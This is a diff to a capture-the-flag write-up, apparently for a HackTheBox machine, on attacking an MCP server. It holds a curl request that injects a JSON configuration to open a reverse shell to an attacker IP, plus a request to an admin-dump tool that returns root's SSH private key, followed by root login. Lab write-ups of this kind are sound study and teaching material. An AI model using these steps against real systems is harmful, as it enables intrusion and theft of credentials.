@@ -11,6 +11,7 @@
 - Payload Delivery: Utilizing curl to inject a malicious JSON configuration into the /api/mcp/connect endpoint.
 
 ## Reverse shell
+``` bash
 		curl http://devhub.htb:6274/api/mcp/connect \
   	-H "Content-Type: application/json" \
   	-d '{
@@ -21,6 +22,7 @@
   		},
   		"serverId":"rev_shell"
   	}'
+```
 			
 - Establishing a callback to `10.10.14.126:4444` via bash interactive shell.
 - Gaining access to `mcp-dev` user with `uid:1001` 
@@ -44,11 +46,14 @@
 
 ## Privilege escalation (`analyst` -> `root`)
 - process and files examination:
-    - `ps aux |grep /opt` revealed process owned by `root`
+     ``` bash
+      ps aux |grep /opt 
+	  
+	  revealed process owned by `root`
       
  	 	`root        1056  0.0  0.7 111108 28880 ?        Ss   18:29   0:00 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py`
 
-    - `ls -l /opt/opsmcp/server.py `
+      ls -l /opt/opsmcp/server.py 
       
      	 `-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py`
 as we can see, the process above runs program owned by `analyst`, which allows to modify or examine code.
@@ -60,12 +65,12 @@ as we can see, the process above runs program owned by `analyst`, which allows t
   	-  The `ops._admin_dump` handler could read `/root/.ssh/id_rsa`
  
 - exploitation existing flaw:
-  
+  ```bash
 		curl -s http://127.0.0.1:5000/tools/call \
 		  -H "X-API-Key: opsmcp_secret_key_4fXXXXXXXXXXXXXX" \
 		  -H "Content-Type: application/json" \
 		  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
-
+  ```
   request returned `root`'s private ssh key, leading to full system compromise.
 - connecting via ssh using dumped key: `ssh -i key root@devhub.htb`
 - `/root/root.txt` extraction
